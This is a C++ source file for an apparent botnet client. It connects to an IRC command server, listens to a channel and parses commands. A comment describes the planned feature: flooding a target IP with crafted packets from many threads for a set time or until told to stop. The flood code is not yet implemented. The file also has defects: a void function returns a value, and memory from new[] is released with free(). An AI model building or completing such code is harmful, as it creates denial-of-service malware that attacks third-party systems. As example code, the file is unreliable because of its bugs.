#include <iostream>
#include <cstring>
#include <sstream>
#include <string>
#include <vector>
#include <stdio.h>
#include <errno.h>
#include "libircclient/include/libircclient.h"
#include "libircclient/include/libirc_rfcnumeric.h"

/*
 * IRC session context.
 */
typedef struct
{
	char* channel;
	char* nick;

} irc_ctx_t;

std::vector<std::string> getSubstrings(const char* input) {
    std::istringstream iss(input);
    std::vector<std::string> substrings;
    std::string substring;
    while (iss >> substring) {
        substrings.push_back(substring);
    }
    return substrings;
}

void parseCommand(const char* command) {
    std::vector<std::string> commandParams = getSubstrings(command);
    if(commandParams.size() != 4) {
        // Inform server that there is an incorrect number of args
        printf("ERROR: Not exactly 4 params supplied from server");
        return 1;
    }

    std::cout << "commandParams:" << std::endl;
    for (const auto& str : commandParams) {
        std::cout << str << std::endl;
    }

    /*
        Syntax: 
            <PROTOCOL> <TARGET IP> <THREAD COUNT> <DURATION or INDEFINITE>

        -Bot will craft a packet; for instasnce, ICMP packet
        -Make n threads that will loop send packet to target IP
        -Ipv4 only supported currently 
        -Maybe pause on multi-threading, implement after
        -Duration in milliseconds most likely, or perhaps n number of loops? 
        -If server commands indefinite duration, bot will loop until server instructs it to halt
    */
}

void event_connect(irc_session_t* session, const char * event, const char * origin, const char ** params, unsigned int count) {
    std::cout << "Connected to IRC server" << std::endl;

    irc_ctx_t * ctx = (irc_ctx_t *) irc_get_ctx (session);
    irc_cmd_join (session, ctx->channel, 0);
}

void event_numeric(irc_session_t * session, unsigned int event, const char * origin, const char ** params, unsigned int count) {
    std::cout << "Numeric event received: " << event << std::endl;
    for (unsigned int i = 0; i < count; ++i) {
        std::cout << "Param " << i << ": " << params[i] << std::endl;
    }
}

void event_channel(irc_session_t * session, const char * event, const char * origin, const char ** params, unsigned int count) {
    if ( count != 2 )
		return;

    printf("origin: %s\n", origin);

	printf ("'%s' said in channel %s: %s\n", 
		origin ? origin : "someone",
		params[0], params[1] );

    irc_cmd_msg (session, params[0], "Hello, bot speaking");
    parseCommand(params[1]);
}

int main() {
    irc_ctx_t ircContext;
    ircContext.channel = new char[strlen("#testChannel") + 1];
    ircContext.nick = new char[strlen("testNick") + 1];
    strcpy(ircContext.channel, "#testChannel");
    strcpy(ircContext.nick, "testNick");


    irc_callbacks_t callbacks;
    memset ( &callbacks, 0, sizeof(callbacks) );

    callbacks.event_connect = event_connect;
    callbacks.event_numeric = event_numeric;
    callbacks.event_channel = event_channel;

    irc_session_t * session = irc_create_session(&callbacks);

    if (!session) {
        std::cerr << "Session error" << std::endl;
        return 1;
    }

    irc_set_ctx (session, &ircContext);
    irc_option_set( session, LIBIRC_OPTION_STRIPNICKS );

    if ( irc_connect (session, "192.168.1.5", 6667, 0, "s1botNick", "s1RealName", "s1Username") ) { // Initiate the IRC server connection
		printf ("Could not connect: %s\n", irc_strerror (irc_errno(session)));
		return 1;
	}

	if ( irc_run (session) ) { // Loop function, catches events
		printf ("Could not connect or I/O error: %s\n", irc_strerror (irc_errno(session)));
		return 1;
	}

    // This is bad, will take in command-line args instead of malloc'ing in char*s
    free(ircContext.nick);
    free(ircContext.channel);
    return 0;
}
